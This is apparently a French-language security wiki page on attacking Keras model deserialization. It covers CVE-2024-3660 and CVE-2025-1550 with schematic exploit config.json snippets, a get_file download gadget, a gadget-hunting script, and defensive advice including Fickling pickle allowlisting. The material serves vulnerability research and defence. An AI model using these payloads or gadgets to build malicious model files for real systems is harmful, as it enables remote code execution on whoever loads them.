# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Cette page résume des techniques d'exploitation pratiques contre le pipeline de désérialisation de modèles Keras, explique les internals du format natif .keras et sa surface d'attaque, et fournit une boîte à outils pour chercheurs pour trouver Model File Vulnerabilities (MFVs) et post-fix gadgets.

## Internes du format de modèle .keras

Un fichier .keras est une archive ZIP contenant au minimum :
- metadata.json – informations génériques (par ex., version de Keras)
- config.json – architecture du modèle (surface d'attaque principale)
- model.weights.h5 – poids en HDF5

Le config.json pilote une désérialisation récursive : Keras importe des modules, résout les classes/fonctions et reconstruit les layers/objets à partir de dictionnaires contrôlés par l'attaquant.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La désérialisation effectue:
- Importation de modules et résolution de symboles à partir des clés module/class_name
- Appel de from_config(...) ou du constructeur avec des kwargs contrôlés par l'attaquant
- Récursion dans les objets imbriqués (activations, initializers, constraints, etc.)

Historiquement, cela exposait trois primitives à un attaquant forgeant config.json:
- Contrôle des modules importés
- Contrôle des classes/fonctions résolues
- Contrôle des kwargs passés aux constructeurs/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Cause racine:
- Lambda.from_config() utilisait python_utils.func_load(...) qui décodait en base64 et appelait marshal.loads() sur des octets fournis par l'attaquant; la désérialisation Python peut exécuter du code.

Idée d'exploit (payload simplifié dans config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Atténuation :
- Keras impose safe_mode=True par défaut. Les fonctions Python sérialisées dans Lambda sont bloquées sauf si un utilisateur choisit explicitement safe_mode=False.

Remarques :
- Formats legacy (anciennes sauvegardes HDF5) ou bases de code plus anciennes peuvent ne pas appliquer les contrôles modernes, donc des attaques de type “downgrade” peuvent encore s'appliquer lorsque les victimes utilisent d'anciens loaders.

## CVE-2025-1550 – Import arbitraire de module dans Keras ≤ 3.8

Cause racine :
- _retrieve_class_or_fn utilisait importlib.import_module() sans restriction avec des chaînes de module contrôlées par l'attaquant provenant de config.json.
- Impact : Import arbitraire de n'importe quel module installé (ou d'un module placé par l'attaquant sur sys.path). Le code s'exécute à l'import, puis l'objet est construit avec des kwargs fournis par l'attaquant.

Idée d'exploit :
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Améliorations de sécurité (Keras ≥ 3.9) :
- Module allowlist: les imports sont restreints aux modules officiels de l'écosystème : keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True bloque le chargement de fonctions sérialisées Lambda non sécurisées
- Basic type checking: les objets désérialisés doivent correspondre aux types attendus

## Surface de gadgets post-fix dans l'allowlist

Même avec l'allowlisting et le safe mode, une large surface reste présente parmi les callables Keras autorisés. Par exemple, keras.utils.get_file peut télécharger des URLs arbitraires vers des emplacements choisis par l'utilisateur.

Gadget via Lambda qui référence une fonction autorisée (et non du bytecode Python sérialisé) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() préfixe le tenseur d'entrée comme premier argument positionnel lors de l'invocation du callable cible. Les gadgets choisis doivent tolérer un argument positionnel supplémentaire (ou accepter *args/**kwargs). Cela contraint les fonctions viables.

Potential impacts of allowlisted gadgets:
- Téléchargement/écriture arbitraire (path planting, config poisoning)
- Callbacks réseau/effets de type SSRF selon l'environnement
- Chaînage vers l'exécution de code si les chemins écrits sont ensuite importés/exécutés ou ajoutés à PYTHONPATH, ou si un emplacement exécutable-à-l'écriture existe

## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Énumérer les callables candidats dans keras, keras_nlp, keras_cv, keras_hub et prioriser ceux ayant des effets secondaires sur les fichiers/le réseau/les processus/l'environnement.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Tests de désérialisation directs (aucune archive .keras nécessaire)

Injectez des dicts spécialement conçus directement dans les désérialiseurs Keras pour découvrir les paramètres acceptés et observer les effets secondaires.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Tests inter-versions et formats

Keras existe dans plusieurs bases de code/époques avec des garde-fous et formats différents :
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, prévu pour suppression)
- tf-keras: maintenu séparément
- Multi-backend Keras 3 (official): a introduit le format natif .keras

Répétez les tests à travers les bases de code et formats (.keras vs legacy HDF5) pour détecter des régressions ou l'absence de garde-fous.

## Recommandations défensives

- Considérez les fichiers de modèle comme des entrées non fiables. Ne chargez des modèles que depuis des sources de confiance.
- Maintenez Keras à jour ; utilisez Keras ≥ 3.9 pour bénéficier de l'allowlisting et des vérifications de type.
- Ne réglez pas safe_mode=False lors du chargement des modèles, sauf si vous faites entièrement confiance au fichier.
- Envisagez d'exécuter la désérialisation dans un environnement sandboxé, avec les privilèges minimaux, sans sortie réseau et avec un accès au système de fichiers restreint.
- Appliquez des allowlists/signatures pour les sources de modèles et vérifiez l'intégrité lorsque c'est possible.

## ML pickle import allowlisting for AI/ML models (Fickling)

De nombreux formats de modèles AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, anciens artefacts TensorFlow, etc.) embarquent des données Python pickle. Les attaquants abusent régulièrement des imports GLOBAL de pickle et des constructeurs d'objets pour obtenir un RCE ou remplacer des modèles lors du chargement. Les scanners basés sur des listes noires manquent souvent des imports dangereux nouveaux ou non listés.

Une défense pratique en mode fail-closed consiste à intercepter le désérialiseur pickle de Python et à n'autoriser qu'un ensemble révisé d'importations liées au ML non dangereuses lors de l'unpickling. Trail of Bits’ Fickling implémente cette politique et fournit une allowlist d'importations ML triée, construite à partir de milliers de pickles publics Hugging Face.

Modèle de sécurité pour les imports “safe” (intuitions distillées de la recherche et de la pratique) : les symboles importés utilisés par un pickle doivent simultanément :
- Ne pas exécuter de code ni provoquer d'exécution (pas d'objets code compilé/source, pas d'exécution de shell, pas de hooks, etc.)
- Ne pas lire/écrire des attributs ou éléments arbitraires
- Ne pas importer ni obtenir des références à d'autres objets Python depuis la VM pickle
- Ne pas déclencher de désérialiseurs secondaires (p.ex., marshal, nested pickle), même indirectement

Activez les protections de Fickling le plus tôt possible au démarrage du processus afin que tous les chargements de pickle effectués par les frameworks (torch.load, joblib.load, etc.) soient contrôlés :
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Conseils opérationnels :
- Vous pouvez temporairement désactiver/réactiver les hooks là où c'est nécessaire :
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modèle connu et fiable est bloqué, étendez l'allowlist pour votre environnement après avoir examiné les symboles :
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling expose également des gardes d'exécution génériques si vous préférez un contrôle plus granulaire :
- fickling.always_check_safety() pour appliquer des vérifications pour tous les pickle.load()
- with fickling.check_safety(): pour une application limitée dans une portée
- fickling.load(path) / fickling.is_likely_safe(path) pour des vérifications ponctuelles

- Préférez des formats de modèle non-pickle lorsque possible (p.ex., SafeTensors). Si vous devez accepter des pickle, exécutez les loaders selon le principe du moindre privilège sans sortie réseau et appliquez l'allowlist.

Cette stratégie allowlist-first bloque de manière démontrable les chemins d'exploitation courants des pickle en ML tout en maintenant une compatibilité élevée. Dans le benchmark de ToB, Fickling a signalé 100% des fichiers malveillants synthétiques et a autorisé ~99% des fichiers propres provenant des principaux repos Hugging Face.

## Références

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
